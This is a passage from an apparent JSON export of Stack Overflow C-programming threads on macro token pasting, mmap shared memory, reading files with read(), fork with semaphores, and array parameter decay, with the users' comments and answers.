expands  <code>newdef(input,5);</code> into</p>\n\n<pre><code>char inputsumthing[5 * sizeof(str_t)]; str_t *input = (str_t *) intputsumthing;\n</code></pre>\n\n<p>That is, it expands into a declaration of a variable named like the first parameter.</p>\n\n<p>Your \"optional changes\" would unconditionally name the declared pointer variable \"var1\" and make it impossible to use the macro more than once in the same scope.<br>\nAlso, <code>newdef(input,5)=\"Hello\";</code> would expand to an error:</p>\n\n<pre><code>char inputsumthing[5 * sizeof(str_t)]; \nstr_t *var1 = (str_t *)inputsumthing = \"Hello\";\n</code></pre>\n\n<p>As a side note, the original macro seems to mostly be an obfuscation of</p>\n\n<pre><code>str_t inputs[5];\nstr_t* input = inputs;\n</code></pre>\n"}], "owner": {"reputation": 465, "user_id": 3050164, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/efDzZ.jpg?s=128&g=1", "display_name": "Anirban", "link": "https://stackoverflow.com/users/3050164/anirban"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 110, "favorite_count": 0, "closed_date": 1459349641, "accepted_answer_id": 36304856, "answer_count": 2, "score": 1, "last_activity_date": 1459330441, "creation_date": 1459329267, "last_edit_date": 1459329969, "question_id": 36304415, "link": "https://stackoverflow.com/questions/36304415/using-operator", "closed_reason": "Duplicate", "title": "Using ## operator", "body": "<p>I am having a code that says:</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n\ntypedef struct string{\n    char *ch_ptr;\n}str_t;\n\n#define newdef(a,b) \\\n    char a ## sumthing[b * sizeof(str_t)]; \\\n    str_t *a = (str_t *)a ## sumthing\n\nmain(){\n    newdef(input,5);\n    /*     some lines of code */\n}\n</code></pre>\n\n<p>Optional changes to code:</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n\ntypedef struct string{\n    char *ch_ptr;\n}str_t;\n\n#define newdef(a,b) \\\n    char a ## sumthing[b * sizeof(str_t)]; \\\n    str_t *var1 = (str_t *)a ## sumthing\n\nmain(){\n    newdef(input,5)=\"Hello\";\n    printf(\"%s\\n\",input);\n    /*     some lines of code */\n}\n</code></pre>\n\n<p>Can anyone explain what this code segment means? Is <code>input</code> in this code a string (hope not) or a variable? If a variable then why doesn't the compiler throw an undeclared variable error?</p>\n"}, {"tags": ["c", "pointers", "shared-memory", "offset", "mmap"], "comments": [{"owner": {"reputation": 10901, "user_id": 1076479, "user_type": "registered", "accept_rate": 20, "profile_image": "https://i.stack.imgur.com/eLQUX.jpg?s=128&g=1", "display_name": "Gil Hamilton", "link": "https://stackoverflow.com/users/1076479/gil-hamilton"}, "edited": false, "score": 0, "creation_date": 1459337411, "post_id": 36304290, "comment_id": 60238525, "body": "Start by checking the return values: <code>if (buf == MAP_FAILED) perror(&quot;buf mapping failed&quot;); ...</code> Probably your <code>mmap</code> call is failing."}], "owner": {"reputation": 581, "user_id": 3523169, "user_type": "registered", "accept_rate": 31, "profile_image": "https://www.gravatar.com/avatar/112db5af45540908d7d2503db16f1ccc?s=128&d=identicon&r=PG&f=1", "display_name": "Xhark", "link": "https://stackoverflow.com/users/3523169/xhark"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 110, "favorite_count": 2, "answer_count": 0, "score": 3, "last_activity_date": 1459337537, "creation_date": 1459328884, "last_edit_date": 1459337537, "question_id": 36304290, "link": "https://stackoverflow.com/questions/36304290/sharing-several-variables-using-one-file", "title": "Sharing several variables using one file", "body": "<p>I'm trying to share two variables between two different processes: an array and an int. And I want to use the same file. When I call mmap(), and using the offset as I think it works, I get a segmentation fault when I try to use the int.</p>\n\n<pre><code>  buf = (int *)mmap(NULL,N*sizeof(int),PROT_WRITE,MAP_SHARED,compart,0);\n  count = (int *)mmap(NULL,sizeof(int), PROT_READ | PROT_WRITE, MAP_SHARED,compart,N*sizeof(int));\n  *count = 0;\n</code></pre>\n\n<p>What I do is  locate the array at the beginning of the file, and the int at the position following the size of the array.</p>\n\n<p>Am I getting something wrong?</p>\n"}, {"tags": ["c", "linux", "gcc"], "comments": [{"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 1, "creation_date": 1459328103, "post_id": 36304001, "comment_id": 60231796, "body": "Post your code could be a good starting point. BTW try <code>.&#47;comp.out .&#47;input.txt .&#47;input.txt</code>"}, {"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 0, "creation_date": 1459328489, "post_id": 36304001, "comment_id": 60232068, "body": ".. and close your descriptors."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1459328608, "post_id": 36304001, "comment_id": 60232141, "body": "Not directly related to your problem, but for efficiency reasons you shouldn&#39;t read the files byte per byte but you should read at least 1Kb at a time."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1459328817, "post_id": 36304001, "comment_id": 60232298, "body": "If <code>read</code> returns -1, then <code>errno</code> is set and that value will provide more information why the read has failed."}, {"owner": {"reputation": 47, "user_id": 5581899, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/af571fb89c8a007302f46a6cc51d67d3?s=128&d=identicon&r=PG&f=1", "display_name": "Shay Chercavsky", "link": "https://stackoverflow.com/users/5581899/shay-chercavsky"}, "edited": false, "score": 0, "creation_date": 1459328959, "post_id": 36304001, "comment_id": 60232390, "body": "first: I know the efficiency is bad. 2nd: how can I see the errno value?"}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 1, "creation_date": 1459328990, "post_id": 36304001, "comment_id": 60232409, "body": "start by printing <code>path1</code> and <code>path2</code> to make sure they have the values you think they have."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1459329028, "post_id": 36304001, "comment_id": 60232429, "body": "Not related to your problem, but you should ask yourself if <code>write(2, &quot;Cannot read input file\\n&quot;, 24)</code> is really a goot idea. (Hint: <code>&quot;Cannot read input file\\n&quot;</code> has only 23 chars)"}, {"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 1, "creation_date": 1459329042, "post_id": 36304001, "comment_id": 60232440, "body": "<a href=\"http://man7.org/linux/man-pages/man3/perror.3.html\" rel=\"nofollow noreferrer\"><code>perror(path1);</code></a> may come in handy, btw (or <code>path2</code> obviously)."}, {"owner": {"reputation": 47, "user_id": 5581899, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/af571fb89c8a007302f46a6cc51d67d3?s=128&d=identicon&r=PG&f=1", "display_name": "Shay Chercavsky", "link": "https://stackoverflow.com/users/5581899/shay-chercavsky"}, "edited": false, "score": 0, "creation_date": 1459329091, "post_id": 36304001, "comment_id": 60232470, "body": "Please explain. You want me write what exactly?"}, {"owner": {"reputation": 47, "user_id": 5581899, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/af571fb89c8a007302f46a6cc51d67d3?s=128&d=identicon&r=PG&f=1", "display_name": "Shay Chercavsky", "link": "https://stackoverflow.com/users/5581899/shay-chercavsky"}, "edited": false, "score": 0, "creation_date": 1459329191, "post_id": 36304001, "comment_id": 60232523, "body": "I am really new to linux. please elaborate about the system calls you ask me to write."}, {"owner": {"reputation": 2887, "user_id": 5845470, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/606531753afd42de16d82a1199fc4d45?s=128&d=identicon&r=PG&f=1", "display_name": "jdarthenay", "link": "https://stackoverflow.com/users/5845470/jdarthenay"}, "edited": false, "score": 0, "creation_date": 1459329201, "post_id": 36304001, "comment_id": 60232531, "body": "What is there in your file <code>comp.out</code>? Is there code in the file <code>input.txt</code>?"}, {"owner": {"reputation": 47, "user_id": 5581899, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/af571fb89c8a007302f46a6cc51d67d3?s=128&d=identicon&r=PG&f=1", "display_name": "Shay Chercavsky", "link": "https://stackoverflow.com/users/5581899/shay-chercavsky"}, "edited": false, "score": 0, "creation_date": 1459329498, "post_id": 36304001, "comment_id": 60232738, "body": "input.txt is just a txt file with a few characters - no code"}, {"owner": {"reputation": 2887, "user_id": 5845470, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/606531753afd42de16d82a1199fc4d45?s=128&d=identicon&r=PG&f=1", "display_name": "jdarthenay", "link": "https://stackoverflow.com/users/5845470/jdarthenay"}, "edited": false, "score": 0, "creation_date": 1459329758, "post_id": 36304001, "comment_id": 60232930, "body": "I see no <code>Cannot read input file</code> in your code, so this seems to be a compilation error. What command do you you to compile?"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "reply_to_user": {"reputation": 2887, "user_id": 5845470, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/606531753afd42de16d82a1199fc4d45?s=128&d=identicon&r=PG&f=1", "display_name": "jdarthenay", "link": "https://stackoverflow.com/users/5845470/jdarthenay"}, "edited": false, "score": 0, "creation_date": 1459329866, "post_id": 36304001, "comment_id": 60233009, "body": "@jdarthenay I can see <code>write(2, &quot;Cannot read input file\\n&quot;, 24);</code> at line 18."}, {"owner": {"reputation": 2887, "user_id": 5845470, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/606531753afd42de16d82a1199fc4d45?s=128&d=identicon&r=PG&f=1", "display_name": "jdarthenay", "link": "https://stackoverflow.com/users/5845470/jdarthenay"}, "edited": false, "score": 0, "creation_date": 1459329979, "post_id": 36304001, "comment_id": 60233089, "body": "@Micheal Oh sorry, I need new glasses..."}, {"owner": {"reputation": 47, "user_id": 5581899, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/af571fb89c8a007302f46a6cc51d67d3?s=128&d=identicon&r=PG&f=1", "display_name": "Shay Chercavsky", "link": "https://stackoverflow.com/users/5581899/shay-chercavsky"}, "edited": false, "score": 0, "creation_date": 1459331778, "post_id": 36304001, "comment_id": 60234473, "body": "ok, I tried your sollutions. It works if I add ./ before input.txt files. Is there a solution for not using ./?"}], "answers": [{"tags": [], "owner": {"reputation": 1791, "user_id": 5022759, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Hg0HA.png?s=128&g=1", "display_name": "ikrabbe", "link": "https://stackoverflow.com/users/5022759/ikrabbe"}, "is_accepted": false, "score": 2, "last_activity_date": 1459329598, "last_edit_date": 1459329598, "creation_date": 1459328897, "answer_id": 36304294, "question_id": 36304001, "link": "https://stackoverflow.com/questions/36304001/when-i-try-to-read-from-txt-file-it-returns-cannot-read-input-file/36304294#36304294", "title": "when I try to read from txt file it returns : Cannot read input file", "body": "<p>Make yourself a better world and ask the system about <code>errno</code>, and read the manual about the system calls read(2), open(2),... and errno(3)</p>\n\n<p>(read(2) for example is a manual page address, saying: Manual page \"read\" in section 2, read <code>man man</code> about sections).</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;errno.h&gt;\n[...]\n\n    char* err = strerror(errno);\n    char* errlen = err ? strlen(err): 0;\n    char* form = \"Cannot read input file since \\\"%s\\\".\\n\"\n    if (errlen == 0) {\n        form = \"Cannot read input file failed with unknown error %d.\\n\";\n        fprintf(stderr, form, errno);\n    }\n    else {\n        fprintf(stderr, form, err);\n    }\n</code></pre>\n\n<p>As you cannot use fprintf, I leave it for you to write the forms. At least you should print out the <code>errno</code> after the failed read.</p>\n"}, {"tags": [], "owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "is_accepted": false, "score": 1, "last_activity_date": 1459330529, "creation_date": 1459330529, "answer_id": 36304892, "question_id": 36304001, "link": "https://stackoverflow.com/questions/36304001/when-i-try-to-read-from-txt-file-it-returns-cannot-read-input-file/36304892#36304892", "title": "when I try to read from txt file it returns : Cannot read input file", "body": "<p>The problem is here:</p>\n\n<p>You declare:</p>\n\n<pre><code> char *firstFile = NULL, *secondFile = NULL;\n</code></pre>\n\n<p>and then you use </p>\n\n<pre><code>read(fd1, firstFile, 1);\n</code></pre>\n\n<p>when <code>firstFile</code> is <code>NULL</code>, and therefore <code>read</code> fails.</p>\n\n<p>Declare <code>firstFile</code> and <code>secondFile</code> like this:</p>\n\n<pre><code>char firstFile[1];\nchar secondFile[1];\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 356, "user_id": 5806473, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-B9DbqUBMB3k/AAAAAAAAAAI/AAAAAAAAARM/D_jrrUoS6NQ/photo.jpg?sz=128", "display_name": "Sumukh Bhandarkar", "link": "https://stackoverflow.com/users/5806473/sumukh-bhandarkar"}, "is_accepted": false, "score": -1, "last_activity_date": 1459335917, "creation_date": 1459335917, "answer_id": 36306964, "question_id": 36304001, "link": "https://stackoverflow.com/questions/36304001/when-i-try-to-read-from-txt-file-it-returns-cannot-read-input-file/36306964#36306964", "title": "when I try to read from txt file it returns : Cannot read input file", "body": "<p>Check whether the file exists in the given path or not</p>\n"}], "owner": {"reputation": 47, "user_id": 5581899, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/af571fb89c8a007302f46a6cc51d67d3?s=128&d=identicon&r=PG&f=1", "display_name": "Shay Chercavsky", "link": "https://stackoverflow.com/users/5581899/shay-chercavsky"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 78, "favorite_count": 1, "answer_count": 3, "score": -1, "last_activity_date": 1459335917, "creation_date": 1459327997, "last_edit_date": 1459330346, "question_id": 36304001, "link": "https://stackoverflow.com/questions/36304001/when-i-try-to-read-from-txt-file-it-returns-cannot-read-input-file", "title": "when I try to read from txt file it returns : Cannot read input file", "body": "<p>I am trying to write a program that compares 2 files and return if their equal or not.</p>\n\n<p>I can only use the functions: fork, dup, dup2, open, write, exec, read.</p>\n\n<p>When I compile the program on linux gcc, it returns \n<strong>Cannot read input file</strong></p>\n\n<pre><code>shay@shay-Latitude-E6410 ~/workspace/targ1OS $ ./comp.out input.txt input.txt Cannot read input file\n</code></pre>\n\n<p>the code: </p>\n\n<pre><code>/*\n* This function checks if the files are similar or similar by case    sensitive\n * it gets 2 files, and returns: 3 if identical, 2 if identical but only if not\n * case sensitive or 1 else.\n */\nint CheckSimilar(char *path1, char *path2){\n\n//open the files\nint fd1 = open(path1, O_RDONLY), fd2 = open(path2, O_RDONLY);\nint flag = 1;//this flag is to check for case sensitive\nchar *firstFile = NULL, *secondFile = NULL;\nint readBytes, read2ndFile;\n\nif (fd1 == -1 || fd2 == -1){\n    write(2, \"Cannot open input file\\n\", 24);\n    return -1;//checks if there is a problem opening the file\n}\n\nwhile (1){\n\n    readBytes = read(fd1, firstFile, 1);\n    read2ndFile = read(fd2, secondFile, 1);\n\n    if (readBytes &lt; 0 || read2ndFile &lt; 0){\n        write(2, \"Cannot read input file\\n\", 24);\n        return -1;\n    }//checks if there is a problem reading chars from the file\n\n    if (!readBytes || !read2ndFile)\n        break;\n\n    if (*firstFile == *secondFile)\n        continue;//the chars are equal\n    //checks if it's an abc char\n    else if ((*firstFile &gt; 64 &amp;&amp; *firstFile &lt; 91) ||\n            (*firstFile &gt; 96 &amp;&amp; *firstFile &lt; 123)){\n        // checks for not case sensitive\n        if ((*firstFile - *secondFile) == 22 ||\n                (*firstFile - *secondFile) == -22)\n            flag = 0;\n    }\n    else\n        return 1;\n}\n\nclose(fd1);\nclose(fd2);\n\nif (readBytes != read2ndFile)\n    return 1;\nif (flag)\n    return 2;\nreturn 3;\n}\n</code></pre>\n"}, {"tags": ["c", "process", "fork", "semaphore"], "comments": [{"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1459331186, "post_id": 36303901, "comment_id": 60234031, "body": "the function: <code>fork()</code> can return 2 normal conditions and one error condition.   ==-1 means <code>fork()</code> failed.   &gt;0 means in parent process  ==0 means in child process.  One easy way to handle this is following the call to <code>fork()</code> with a switch statement <code>case -1:</code>// error  <code>case 0:</code> // child and <code>default:</code> //parent   The code needs to properly handle all three conditions.  Note since 1 is the pid of the <code>init()</code> function, a call to <code>fork()</code> will never return 1  However, it can return -1"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1459331563, "post_id": 36303901, "comment_id": 60234301, "body": "when a process &#39;blocks&#39; then the OS will switch to another process that is &#39;ready to continue&#39;.   However, the next process to run (probably) will not be the other process just created.  This should not concern you at all.  The other child process will be blocked via the call to <code>semwait()</code> and when the first child process calls <code>sempost()</code> that will allow the second child process to change from &#39;blocked&#39; to`ready to run&#39; so it will be placed on the execution queue and will run when the OS (eventually) continues its&#39; execution."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1459331684, "post_id": 36303901, "comment_id": 60234396, "body": "this statement: <code>if(pid() == 0</code> is nonsense.  the &#39;pid&#39; is a <code>pid_t</code> variable, not a function."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1459331781, "post_id": 36303901, "comment_id": 60234477, "body": "strongly suggest reading the man page for <code>fork()</code>, as that will clear up most of your questions."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1459331937, "post_id": 36303901, "comment_id": 60234611, "body": "you might want to read/understand the concept of <code>context switching</code> to get a better idea about how things work in the OS.  Suggest google: <code>context switching</code>"}], "owner": {"reputation": 183, "user_id": 2805004, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/cf657a38a5359c7b8bb05ef57fa640c3?s=128&d=identicon&r=PG&f=1", "display_name": "user2805004", "link": "https://stackoverflow.com/users/2805004/user2805004"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 405, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1459330245, "creation_date": 1459327703, "last_edit_date": 1459330245, "question_id": 36303901, "link": "https://stackoverflow.com/questions/36303901/trying-to-understand-forks-and-semaphores", "title": "Trying to understand forks and semaphores", "body": "<p>What I am trying to do in my code is have a parent process that forks two children processes. This is how I've done it:</p>\n\n<pre><code>pid = fork();\n\nif(pid != 1)\n    pid1 = fork();\n</code></pre>\n\n<p>The next thing I'm trying to do is switch between the processes continuously (from child to other child to parent, in that order) using semaphores. <em>ie</em> the child process will  say A, the other child will say B, the parent will say C, the child will say D, and so on.</p>\n\n<p>My two questions are:</p>\n\n<ul>\n<li><p>Say you call <code>sem_wait(sem)</code> in a semaphore and the process blocks as it should. You then move on and the other process ends up calling <code>sem_post(sem)</code>. Will the code following the <code>sem_wait</code> be immediately executed after the <code>sem_post</code>? <em>ie</em> does the execution \"jump back\" to the code after the <code>sem_wait</code> even if it doesn't come \"next\" in the program?  </p>\n\n<pre><code>if(stuff){\n    a; \n    sem_wait(sem); \n    b;\n}\nc; \n\nsem_post(sem);\n</code></pre></li>\n</ul>\n\n<p>Will <code>b</code> be executed even though it's \"before\" the post in terms of coming before it textually?</p>\n\n<ul>\n<li>How can I identify the processes so that I may give one of them permission to execute? I have to confirm that a process is either child 1 , child 2 or parent before I give it permission to execute the code, but how can I tell? I tried to check using <code>if</code> statements (<code>if(pid) != 0</code>, <code>if(pid() == 0</code> and <code>if(pid1 == 0)</code> assuming that the parent would have a return value of 0 for the the first fork and the children would have zero's for their respective forks) but this did not work. I checked their PID's and PPID's and they were all over the place).</li>\n</ul>\n\n<p>All help is appreciated, thank you</p>\n"}, {"tags": ["c", "arrays", "pointers", "struct"], "comments": [{"owner": {"reputation": 539, "user_id": 5516068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c2bb9fa382e0aca02cbaefa8596bf4b0?s=128&d=identicon&r=PG&f=1", "display_name": "Efraim Weiss", "link": "https://stackoverflow.com/users/5516068/efraim-weiss"}, "edited": false, "score": 2, "creation_date": 1459327744, "post_id": 36303828, "comment_id": 60231547, "body": "Have you tried functionB(point)?"}, {"owner": {"reputation": 3852, "user_id": 921723, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38e3b1e32ece685d794a2d839300166c?s=128&d=identicon&r=PG", "display_name": "Jite", "link": "https://stackoverflow.com/users/921723/jite"}, "edited": false, "score": 0, "creation_date": 1459328295, "post_id": 36303828, "comment_id": 60231931, "body": "I recommend that you replace <code>struct1 *point[]</code> in the argument declaration for <code>functionB</code> and replace it with <code>struct1 **point</code> to <b>not</b> do mistakes like <code>sizeof(point)</code> within the function because that won&#39;t work. You can pass an array as an argument, however it will be &quot;denoted (? don&#39;t remember correct term)&quot; to a pointer (to the first array item) in the called function. If you declare an array in a function, you can however do <code>sizeof</code> on that array in that scope. That&#39;s why it might be misleading."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 3852, "user_id": 921723, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38e3b1e32ece685d794a2d839300166c?s=128&d=identicon&r=PG", "display_name": "Jite", "link": "https://stackoverflow.com/users/921723/jite"}, "edited": false, "score": 0, "creation_date": 1459330431, "post_id": 36303828, "comment_id": 60233442, "body": "@Jite There is no reason to use pointer-to-pointers here."}, {"owner": {"reputation": 3852, "user_id": 921723, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38e3b1e32ece685d794a2d839300166c?s=128&d=identicon&r=PG", "display_name": "Jite", "link": "https://stackoverflow.com/users/921723/jite"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1459406930, "post_id": 36303828, "comment_id": 60274648, "body": "@Lundin It was meant in generic terms though, if it&#39;s <code>struct *point</code> and <code>struct point[]</code> or <code>struct **point</code> and <code>struct *point[]</code> (...) doesn&#39;t really matter. The point I was trying to make was that specifying function arguments as arrays instead of (pointer to ...) pointer is IMO bad practice and might lead to making unnecessary mistakes like <code>sizeof</code>."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 3852, "user_id": 921723, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38e3b1e32ece685d794a2d839300166c?s=128&d=identicon&r=PG", "display_name": "Jite", "link": "https://stackoverflow.com/users/921723/jite"}, "edited": false, "score": 0, "creation_date": 1459407185, "post_id": 36303828, "comment_id": 60274807, "body": "@Jite No, common sense dictates that specifying an array as argument to a function expecting an array is good practice. Doing so leads to <i>self-documenting code</i>. As it happens, array parameters to functions will decay into pointers to the first object, but just because the C language has this weird feature, it doesn&#39;t mean that you should write programs where you have done the &quot;decay&quot; manually. It makes type compatibility checking (by intelligent tools other than the average compiler) impossible and it makes the program harder to read."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 3852, "user_id": 921723, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38e3b1e32ece685d794a2d839300166c?s=128&d=identicon&r=PG", "display_name": "Jite", "link": "https://stackoverflow.com/users/921723/jite"}, "edited": false, "score": 0, "creation_date": 1459407603, "post_id": 36303828, "comment_id": 60275072, "body": "@Jite And the sizeof issue shouldn&#39;t be a problem, if the programmer doesn&#39;t know about array decay in functions, no coding style will save them. If you need to use sizeof inside the function, you should use an array pointer: <code>void func (size_t size, int (*arr)[size]) {   printf(&quot;%zu&quot;, sizeof(*arr)); }</code>  Or just <code>sizeof(int) * size</code>."}, {"owner": {"reputation": 3852, "user_id": 921723, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38e3b1e32ece685d794a2d839300166c?s=128&d=identicon&r=PG", "display_name": "Jite", "link": "https://stackoverflow.com/users/921723/jite"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1459407756, "post_id": 36303828, "comment_id": 60275148, "body": "@Lundin I don&#39;t agree with you and I wouldn&#39;t draw the conclusion that it&#39;s common sense either. I just had a quick Google about it, seems like Torvalds agree with me about this: <a href=\"https://lkml.org/lkml/2015/9/3/428\" rel=\"nofollow noreferrer\">lkml.org/lkml/2015/9/3/428</a> (well the most common way would be to send along size (in some form) in another argument)"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 3852, "user_id": 921723, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38e3b1e32ece685d794a2d839300166c?s=128&d=identicon&r=PG", "display_name": "Jite", "link": "https://stackoverflow.com/users/921723/jite"}, "edited": false, "score": 0, "creation_date": 1459408203, "post_id": 36303828, "comment_id": 60275423, "body": "@Jite The array decay rule is found at 6.7.6.3/7: <code>A declaration of a parameter as \u2018\u2018array of type\u2019\u2019 shall be adjusted to \u2018\u2018qualified pointer to type\u2019\u2019, where the type qualifiers (if any) are those specified within the [ and ] of the array type derivation. If the keyword static also appears within the [ and ] of the array type derivation, then for each call to the function, the value of the corresponding actual argument shall provide access to the first element of an array with at least as many elements as specified by the size expression.</code>"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 3852, "user_id": 921723, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38e3b1e32ece685d794a2d839300166c?s=128&d=identicon&r=PG", "display_name": "Jite", "link": "https://stackoverflow.com/users/921723/jite"}, "edited": false, "score": 0, "creation_date": 1459408323, "post_id": 36303828, "comment_id": 60275495, "body": "@Jite As we can see, you declare parameters as arrays, but they always decay into pointers. C is not Torvald&#39;s strongest skill (his strongest skill is arrogance). This: &quot;because array arguments in C don&#39;t actually exist. Sadly, compilers accept it for various bad historical reasons, and silently turn it into just a pointer argument. There are arguments for them, but they are from weak minds.&quot; is just nonsense. I would like to hear him explain what <code>void func (int array [static 5])</code> is."}, {"owner": {"reputation": 3852, "user_id": 921723, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38e3b1e32ece685d794a2d839300166c?s=128&d=identicon&r=PG", "display_name": "Jite", "link": "https://stackoverflow.com/users/921723/jite"}, "reply_to_user": {"reputation": 